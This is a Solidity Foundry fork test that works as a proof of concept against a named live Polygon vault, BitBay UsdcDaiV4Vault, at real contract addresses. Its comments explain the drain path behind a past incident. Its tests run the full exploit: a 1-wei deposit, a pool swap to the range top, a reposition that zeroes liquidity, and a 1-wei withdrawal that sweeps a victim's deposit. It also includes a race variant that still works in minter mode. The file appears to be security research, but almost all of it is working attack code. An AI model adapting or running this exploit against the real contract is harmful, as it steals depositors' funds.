// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Z3-H6 BitBay UsdcDaiV4Vault (Polygon) — re-arm-on-deposit verification (live state 2026-10-16).
//
// The vault's _withdraw() pays the ENTIRE DAI+USDC balance to the caller whenever liquidity == 0
// (no share-weighting). The 2026-10-09 incident (14,838 DAI) drove liquidity to 0 via a
// permissionless sequence: deposit(1 wei) -> public swap pushes the pool tick to the TOP of the
// vault's range (swap limit = sqrtPriceAtTick(tickUpper+1)-1) -> permissionless reposition()
// (newLiquidity rounds to 0 because _getRequiredRatio returns 0) -> withdraw(1 wei share) sweeps
// everything.
//
// LIVE CHANGE (verified): at 2026-10-16 01:07:39 UTC (block 95,605,021) the minter called
// minterOnly(true) -> mintThis == true -> reposition() is now minter-gated. The vault is empty.
// Re-arm conditions: (a) mintThis flips back to false and any deposit lands -> full capture via the
// incident path (fork-proven below); (b) minter mode: an attacker can still push the price to the
// exact range-top boundary and wait for the MINTER's own recentering reposition to zero the
// liquidity (same code path) -> any 1-wei shareholder then sweeps the balance.
//
// Read-only on mainnet: fork only.

import {ForkEnv} from "../src/ForkEnv.sol";
import {TickMath} from "../src/uniswap/TickMath.sol";

interface IVault {
    function deposit(uint256 amount, uint256 deadline) external;
    function withdraw(uint256 shareAmount, uint256 deadline, bool addDust) external;
    function reposition(uint256 deadline) external;
    function minterOnly(bool _mintThis) external;
    function liquidity() external view returns (uint128);
    function totalShares() external view returns (uint256);
    function shares(address) external view returns (uint256);
    function tickLower() external view returns (int24);
    function tickUpper() external view returns (int24);
    function mintThis() external view returns (bool);
    function minter() external view returns (address);
    function lastReposition() external view returns (uint256);
    function POSITION_TIMELOCK() external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IStateView {
    function getSlot0(bytes32 poolId) external view returns (uint160 sqrtPriceX96, int24 tick, uint24 pf, uint24 lf);
}

struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

struct SwapParams {
    bool zeroForOne;
    int256 amountSpecified;
    uint160 sqrtPriceLimitX96;
}

interface IPoolManager {
    function unlock(bytes calldata data) external returns (bytes memory);
    function swap(PoolKey calldata key, SwapParams calldata params, bytes calldata hookData) external returns (int256);
    function sync(address currency) external;
    function settle() external payable returns (uint256);
    function take(address currency, address to, uint256 amount) external;
}

contract BitBayRearmTest is ForkEnv {
    IVault internal constant VAULT = IVault(0x048E88311ca84876aeA086125825492e2AF2e5A0);
    IPoolManager internal constant PM = IPoolManager(0x67366782805870060151383F4BbFF9daB53e5cD6);
    IStateView internal constant SV = IStateView(0x5eA1bD7974c8A611cBAB0bDCAFcB1D9CC9b3BA5a);
    IERC20 internal constant DAI = IERC20(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063);
    IERC20 internal constant USDC = IERC20(0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359);

    PoolKey internal poolKey;
    bytes32 internal poolId;

    uint256 internal swapDaiIn;
    uint256 internal swapUsdcOut;

    function setUp() public {
        vm.createSelectFork(_rpc("POLYGON_RPC_URL", "https://polygon.drpc.org"));
        poolKey = PoolKey({
            currency0: address(USDC),
            currency1: address(DAI),
            fee: 50,
            tickSpacing: 1,
            hooks: address(0)
        });
        poolId = keccak256(abi.encode(poolKey));
    }

    function _tick() internal view returns (int24 t) {
        (, t,,) = SV.getSlot0(poolId);
    }

    receive() external payable {}

    // ------------------------------------------------------------------------------------------
    // 1) Live state today: vault empty; permissionless reposition is minter-gated (mintThis=true).
    // ------------------------------------------------------------------------------------------
    function test_BitBay_today_state_and_gate() public {
        emit log_named_uint("fork block", block.number);
        emit log_named_decimal_uint("vault DAI", DAI.balanceOf(address(VAULT)), 18);
        emit log_named_decimal_uint("vault USDC", USDC.balanceOf(address(VAULT)), 6);
        emit log_named_uint("vault liquidity", VAULT.liquidity());
        emit log_named_uint("vault totalShares", VAULT.totalShares());
        emit log_named_uint("mintThis (0/1)", VAULT.mintThis() ? 1 : 0);
        emit log_named_int("tick", _tick());
        emit log_named_int("tickLower", VAULT.tickLower());
        emit log_named_int("tickUpper", VAULT.tickUpper());

        assertEq(DAI.balanceOf(address(VAULT)), 0, "vault DAI empty today");
        assertEq(USDC.balanceOf(address(VAULT)), 0, "vault USDC empty today");
        assertEq(VAULT.liquidity(), 0, "liquidity 0 today");

        if (VAULT.mintThis()) {
            // live gate: a non-minter cannot reposition (OnlyMinter)
            address stranger = makeAddr("stranger");
            vm.prank(stranger);
            vm.expectRevert();
            VAULT.reposition(block.timestamp + 1);
            emit log("mintThis=true: non-minter reposition reverts (gate live)");
        }
    }

    // ------------------------------------------------------------------------------------------
    // 2) Re-arm (a): mintThis flips back to false + any fresh deposit -> full capture.
    //    Simulates the minter toggling public mode back on, then a victim deposit re-arms the pot.
    // ------------------------------------------------------------------------------------------
    function test_BitBay_rearm_mintThis_false_fresh_deposit_capture() public {
        if (VAULT.mintThis()) {
            vm.prank(VAULT.minter());
            VAULT.minterOnly(false); // toggle back to public mode (the minter can do this any time)
        }
        assertEq(VAULT.mintThis(), false, "public reposition mode");

        uint256 DEPOSIT = 5_000 ether;
        address victim = makeAddr("victim");
        deal(address(DAI), victim, DEPOSIT);
        vm.startPrank(victim);
        DAI.approve(address(VAULT), DEPOSIT);
        VAULT.deposit(DEPOSIT, block.timestamp);
        vm.stopPrank();

        emit log_named_uint("vault liquidity after deposit", VAULT.liquidity());
        emit log_named_int("tickUpper after deposit", VAULT.tickUpper());
        assertGt(VAULT.liquidity(), 0, "deposit creates a live position");

        address attacker = address(this);
        deal(address(DAI), attacker, 1);
        DAI.approve(address(VAULT), 1);
        VAULT.deposit(1, block.timestamp);
        assertEq(VAULT.shares(attacker), 1, "attacker holds a 1-wei share");

        _pushTickToTop(VAULT.tickUpper());
        emit log_named_int("tick after push", _tick());
        assertGe(_tick(), VAULT.tickUpper(), "tick out of range");

        if (block.timestamp <= VAULT.lastReposition() + VAULT.POSITION_TIMELOCK()) {
            vm.warp(VAULT.lastReposition() + VAULT.POSITION_TIMELOCK() + 1);
        }
        VAULT.reposition(block.timestamp);
        emit log_named_uint("vault liquidity after reposition", VAULT.liquidity());

        uint256 daiBefore = DAI.balanceOf(attacker);
        uint256 usdcBefore = USDC.balanceOf(attacker);
        VAULT.withdraw(1, block.timestamp, false);
        uint256 sweptDai = DAI.balanceOf(attacker) - daiBefore;
        uint256 sweptUsdc = USDC.balanceOf(attacker) - usdcBefore;

        emit log_named_decimal_uint("attacker swept DAI", sweptDai, 18);
        emit log_named_decimal_uint("attacker swept USDC", sweptUsdc, 6);
        emit log_named_decimal_uint("attacker swap DAI spent", swapDaiIn, 18);
        emit log_named_decimal_uint("attacker swap USDC received", swapUsdcOut, 6);

        uint256 sweptValue18 = sweptDai + sweptUsdc * 1e12;
        assertGt(sweptValue18, 4_900 ether, "1-wei share sweeps ~the whole re-armed pot");
        assertEq(VAULT.liquidity(), 0, "vault at zero liquidity");
        assertEq(DAI.balanceOf(address(VAULT)), 0, "vault DAI fully drained");
        assertEq(USDC.balanceOf(address(VAULT)), 0, "vault USDC fully drained");

        // net capture after repaying the manipulation-swap loan
        int256 netDai = int256(sweptDai + swapUsdcOut * 1e12) - int256(swapDaiIn) - 1;
        emit log_named_int("attacker NET (DAI 18dp)", netDai);
        assertGt(netDai, int256(DEPOSIT * 99 / 100), "net > 99% of the re-armed deposit");
    }

    // ------------------------------------------------------------------------------------------
    // 3) Re-arm (b): MINTER MODE race — attacker pushes the price to the exact range-top boundary
    //    (permissionless swap), the minter's own recentering reposition then zeroes liquidity and
    //    any 1-wei shareholder sweeps the whole balance. No mintThis toggle needed.
    // ------------------------------------------------------------------------------------------
    function test_BitBay_minter_mode_boundary_race_capture() public {
        uint256 DEPOSIT = 5_000 ether;
        address victim = makeAddr("victim2");
        deal(address(DAI), victim, DEPOSIT);
        vm.startPrank(victim);
        DAI.approve(address(VAULT), DEPOSIT);
        VAULT.deposit(DEPOSIT, block.timestamp);
        vm.stopPrank();
        assertGt(VAULT.liquidity(), 0, "position live");

        // attacker: 1-wei share + hold the price at the exact top of the range
        address attacker = address(this);
        deal(address(DAI), attacker, 1);
        DAI.approve(address(VAULT), 1);
        VAULT.deposit(1, block.timestamp);
        _pushTickToTop(VAULT.tickUpper());
        assertGe(_tick(), VAULT.tickUpper(), "tick parked at the range top");

        // the minter recenters (routine operation) -> liquidity rounds to 0
        vm.prank(VAULT.minter());
        VAULT.reposition(block.timestamp);
        emit log_named_uint("liquidity after minter reposition", VAULT.liquidity());

        uint256 daiBefore = DAI.balanceOf(attacker);
        uint256 usdcBefore = USDC.balanceOf(attacker);
        VAULT.withdraw(1, block.timestamp, false);
        uint256 sweptDai = DAI.balanceOf(attacker) - daiBefore;
        uint256 sweptUsdc = USDC.balanceOf(attacker) - usdcBefore;
        emit log_named_decimal_uint("attacker swept DAI (minter-mode race)", sweptDai, 18);
        emit log_named_decimal_uint("attacker swept USDC (minter-mode race)", sweptUsdc, 6);

        uint256 sweptValue18 = sweptDai + sweptUsdc * 1e12;
        assertGt(sweptValue18, 4_900 ether, "1-wei share sweeps the pot after the minter's reposition");
        assertEq(DAI.balanceOf(address(VAULT)), 0, "vault drained");
    }

    // Push the pool tick to the TOP of tick `targetTick` (1 wei below sqrtPriceAtTick(target+1)):
    // that makes _getRequiredRatio round to 0 in _reposition, zeroing newLiquidity.
    function _pushTickToTop(int24 targetTick) internal {
        uint160 limit = TickMath.getSqrtPriceAtTick(targetTick + 1) - 1;
        uint256 maxIn = 5_000_000 ether;
        deal(address(DAI), address(this), maxIn);
        PM.unlock(abi.encode(maxIn, limit));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(PM), "only PM");
        (uint256 amountMax, uint160 limit) = abi.decode(data, (uint256, uint160));
        int256 delta = PM.swap(
            poolKey,
            SwapParams({zeroForOne: false, amountSpecified: -int256(amountMax), sqrtPriceLimitX96: limit}),
            ""
        );
        int128 amount0 = int128(delta >> 128);
        int128 amount1 = int128(delta);
        uint256 daiOwed = uint256(uint128(-amount1));
        swapDaiIn += daiOwed;
        swapUsdcOut += amount0 > 0 ? uint256(uint128(amount0)) : 0;
        PM.sync(address(DAI));
        DAI.transfer(address(PM), daiOwed);
        PM.settle();
        if (amount0 > 0) PM.take(address(USDC), address(this), uint256(uint128(amount0)));
        return "";
    }
}
